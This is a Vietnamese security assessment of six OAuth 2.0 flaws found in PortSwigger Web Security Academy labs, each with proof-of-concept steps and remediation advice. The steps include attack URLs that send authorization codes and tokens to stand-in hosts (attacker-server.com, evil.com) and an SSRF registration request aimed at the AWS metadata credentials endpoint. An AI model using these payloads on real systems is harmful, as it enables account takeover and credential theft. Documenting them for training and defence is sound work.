# BÁO CÁO ĐÁNH GIÁ BẢO MẬT OAUTH 2.0 (OAUTH SECURITY ASSESSMENT REPORT)

**Dự án:** PortSwigger OAuth Authentication Labs

| Thông tin dự án | Chi tiết |
| :--- | :--- |
| **Mục tiêu đánh giá** | Module OAuth 2.0 & OpenID Connect - PortSwigger Web Security Academy |
| **Người thực hiện** | Mai Hải Đăng |
| **Ngày thực hiện** | 29/01/2026 |
| **Phiên bản báo cáo** | v1.0 |
| **Trạng thái** | Hoàn thành |

## 1. TÓM TẮT QUẢN TRỊ (EXECUTIVE SUMMARY)

### 1.1. Tổng quan

Báo cáo này trình bày kết quả kiểm thử xâm nhập chuyên sâu vào cơ chế xác thực ủy quyền OAuth 2.0 của ứng dụng mục tiêu. OAuth 2.0 là giao thức tiêu chuẩn cho việc ủy quyền, tuy nhiên việc triển khai sai lệch (misconfiguration) thường dẫn đến việc chiếm đoạt tài khoản hoàn toàn.

### 1.2. Kết quả chính

Đợt kiểm thử đã phát hiện **06** lỗ hổng bảo mật, bao gồm **02** lỗ hổng Nghiêm trọng (Critical) liên quan đến chiếm đoạt Token và SSRF, cùng **04** lỗ hổng Cao (High) liên quan đến bypass xác thực và CSRF.

Nguyên nhân gốc rễ chủ yếu nằm ở việc thiếu kiểm soát chặt chẽ tham số `redirect_uri` và không thực hiện đầy đủ các biện pháp chống CSRF (tham số `state`).

---

## 2. CHI TIẾT CÁC LỖ HỔNG (VULNERABILITY FINDINGS)

### FINDING-01: Bỏ qua xác thực qua luồng OAuth Implicit (Authentication Bypass via Implicit Flow)

*   **Mức độ:** Cao (High)
*   **Tham chiếu WSTG:** WSTG-ATHZ-05 (Testing for OAuth Weaknesses), WSTG-ATHN-04

**Mô tả:**

Ứng dụng sử dụng luồng "Implicit Grant Type" (hiện không còn được khuyến nghị) để xác thực người dùng. Trong luồng này, Access Token và thông tin người dùng được gửi trực tiếp về trình duyệt thông qua URL Fragment hoặc POST request mà không qua bước xác thực lại từ phía Backend (Back-channel validation). Kẻ tấn công có thể chặn phản hồi từ Provider và sửa đổi email/username để đăng nhập vào tài khoản bất kỳ.

**Bằng chứng khai thác (Proof of Concept):**

1.  Thực hiện quy trình đăng nhập bằng OAuth.
2.  Sử dụng Burp Suite chặn request `/authenticate` được trình duyệt gửi lên Server ứng dụng sau khi nhận được callback từ Google/Facebook.
3.  Request có dạng JSON:

```json
{ "email": "attacker@gmail.com", "access_token": "..." }
```

4.  Sửa email thành `carlos@target.com` (nạn nhân).
5.  Ứng dụng tin tưởng email này và cấp quyền truy cập vào tài khoản của Carlos mà không kiểm tra token có thực sự thuộc về Carlos hay không.

**Khuyến nghị:**

*   Chuyển sang sử dụng "Authorization Code Flow" với PKCE.
*   Luôn xác thực Access Token từ phía Backend (gọi API `/userinfo` của Provider) thay vì tin tưởng dữ liệu từ Client gửi lên.

### FINDING-02: Liên kết tài khoản cưỡng ép (Forced OAuth Profile Linking - CSRF)

*   **Mức độ:** Cao (High)
*   **Tham chiếu WSTG:** WSTG-SESS-05 (CSRF), WSTG-ATHZ-05

**Mô tả:**

Quy trình liên kết tài khoản mạng xã hội (Social Linking) thiếu tham số bảo vệ chống giả mạo (`state`). Kẻ tấn công có thể bắt đầu quy trình liên kết tài khoản của chính mình, dừng lại ở bước lấy Authorization Code, và lừa nạn nhân nhấp vào đường dẫn hoàn tất. Kết quả là tài khoản mạng xã hội của Kẻ tấn công sẽ được liên kết vào tài khoản ứng dụng của Nạn nhân.

**Bằng chứng khai thác (Proof of Concept):**

1.  Kẻ tấn công đăng nhập tài khoản của mình, chọn "Link with Google".
2.  Chặn request chuyển hướng chứa code, copy URL này.
3.  Hủy bỏ quy trình (Drop request) để code chưa bị sử dụng.
4.  Gửi URL chứa code cho nạn nhân (đang đăng nhập trên ứng dụng).
5.  Khi nạn nhân click vào, ứng dụng sử dụng code của kẻ tấn công để liên kết.
6.  Kẻ tấn công giờ đây có thể chọn "Login with Google" để đăng nhập vào tài khoản của nạn nhân.

**Khuyến nghị:**

*   Bắt buộc sử dụng tham số `state` chứa token ngẫu nhiên (CSRF Token) trong request khởi tạo OAuth.
*   Kiểm tra tính hợp lệ của `state` khi nhận callback.

### FINDING-03: Chiếm đoạt tài khoản OAuth qua redirect_uri (OAuth Account Hijacking)

*   **Mức độ:** Cao (High)
*   **Tham chiếu WSTG:** WSTG-ATHZ-05

**Mô tả:**

Máy chủ Authorization (Provider) thực hiện kiểm tra tham số `redirect_uri` không chặt chẽ (Weak validation). Nó cho phép chuyển hướng code về một tên miền khác hoặc một đường dẫn khác với đăng ký ban đầu. Kẻ tấn công có thể thay đổi `redirect_uri` trỏ về server của mình để đánh cắp Authorization Code của nạn nhân.

**Bằng chứng khai thác (Proof of Concept):**

1.  Tạo một URL đăng nhập OAuth độc hại:

```text
https://oauth-server.com/auth?client_id=...&response_type=code&redirect_uri=https://attacker-server.com
```

2.  Gửi link cho nạn nhân.
3.  Nạn nhân đăng nhập và cấp quyền.
4.  Provider chuyển hướng nạn nhân kèm theo code về `https://attacker-server.com/?code=...`.
5.  Kẻ tấn công lấy được Code và dùng nó để chiếm phiên làm việc.

**Khuyến nghị:**

*   Cấu hình Whitelist chính xác tuyệt đối (Exact Match) cho `redirect_uri` trên OAuth Provider.

### FINDING-04: Chiếm đoạt Token qua lỗi Open Redirect (Stealing Tokens via Open Redirect)

*   **Mức độ:** Cao (High)
*   **Tham chiếu WSTG:** WSTG-ATHZ-05, WSTG-INPV-16

**Mô tả:**

Khi Provider áp dụng Whitelist cho `redirect_uri` nhưng ứng dụng đích lại tồn tại lỗi Open Redirect. Kẻ tấn công có thể xâu chuỗi (chain) hai lỗi này. Chúng đặt `redirect_uri` trỏ về một trang hợp lệ trên ứng dụng đích, nhưng trang đó lại tự động chuyển hướng người dùng sang server của kẻ tấn công.

**Bằng chứng khai thác (Proof of Concept):**

1.  Tìm thấy lỗi Open Redirect tại: `https://target.com/next?path=http://evil.com`.
2.  Cấu trúc URL tấn công OAuth:

```text
&redirect_uri=https://target.com/next?path=http://evil.com
```

3.  OAuth Provider thấy `https://target.com` hợp lệ (trong whitelist) nên chấp nhận gửi Token về đó.
4.  Trang `/next` trên `target.com` nhận Token và chuyển tiếp nó sang `http://evil.com`.

**Khuyến nghị:**

*   Khắc phục triệt để lỗi Open Redirect trong ứng dụng.
*   Sử dụng quy tắc so sánh URL nghiêm ngặt (không cho phép ký tự đặc biệt hay tham số thừa trong `redirect_uri`).

### FINDING-05: Server-Side Request Forgery (SSRF) qua OpenID Dynamic Registration

*   **Mức độ:** Nghiêm trọng (Critical)
*   **Tham chiếu WSTG:** WSTG-INPV-19 (SSRF), WSTG-ATHZ-05

**Mô tả:**

Ứng dụng hỗ trợ đăng ký Client động (Dynamic Client Registration) theo chuẩn OpenID Connect nhưng không kiểm soát các URL trong metadata (như `logo_uri`, `jwks_uri`). Kẻ tấn công có thể đăng ký một Client mới và trỏ các URL này về dịch vụ nội bộ (Metadata Service của Cloud) để đánh cắp thông tin nhạy cảm.

**Bằng chứng khai thác (Proof of Concept):**

1.  Gửi request đăng ký Client mới đến endpoint `/reg`:

```http
POST /reg HTTP/1.1

{
    "redirect_uris": ["https://attacker.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
}
```

2.  Khi người dùng (hoặc admin) truy cập trang đăng nhập OAuth, server sẽ cố gắng tải ảnh Logo từ URL trên.
3.  Kẻ tấn công nhận được AWS Credentials thông qua việc server hiển thị ảnh lỗi hoặc qua Out-of-band interaction.

**Khuyến nghị:**

*   Vô hiệu hóa tính năng Dynamic Registration nếu không cần thiết.
*   Áp dụng Whitelist chặt chẽ cho các giao thức và IP được phép trong các trường URL (chặn IP nội bộ/Private IP).

### FINDING-06: Chiếm đoạt Token qua trang Proxy trung gian (Stealing Tokens via Proxy Page)

*   **Mức độ:** Nghiêm trọng (Expert/Critical)
*   **Tham chiếu WSTG:** WSTG-ATHZ-05, WSTG-INPV-11 (Code Injection - HTML)

**Mô tả:**

Đây là kỹ thuật nâng cao để bypass Whitelist `redirect_uri` chặt chẽ. Kẻ tấn công lợi dụng một lỗ hổng HTML Injection hoặc khả năng upload file trên miền con được whitelist để tạo một trang "Proxy". Trang này nhận Token từ URL fragment và gửi nó về server của kẻ tấn công thông qua postMessage hoặc fetch.

**Bằng chứng khai thác (Proof of Concept):**

1.  Kẻ tấn công tìm thấy tính năng "Viết bình luận" cho phép chèn iframe hoặc script trên `https://target.com/blog`.
2.  Tạo comment chứa script độc hại để lắng nghe và gửi Token (Proxy page).
3.  Đặt `redirect_uri` trỏ về trang blog này: `...&redirect_uri=https://target.com/blog/post/123`.
4.  Token được gửi về trang blog (hợp lệ), script tại đó đọc Token và gửi cho hacker.

**Khuyến nghị:**

*   Ngăn chặn HTML Injection/XSS trên toàn bộ tên miền được whitelist.
*   Sử dụng tiêu đề Content-Security-Policy (CSP) để chặn gửi dữ liệu ra ngoài.

---

## 3. KẾT LUẬN

Module OAuth 2.0 của ứng dụng tồn tại nhiều điểm yếu trong việc xác thực `redirect_uri` và thiếu các cơ chế bảo vệ State/CSRF. Đặc biệt, việc hỗ trợ Dynamic Registration không an toàn và Implicit Flow cũ kỹ tạo ra rủi ro rất lớn. Đề nghị chuyển đổi sang mô hình Authorization Code with PKCE và rà soát lại toàn bộ whitelist URL.
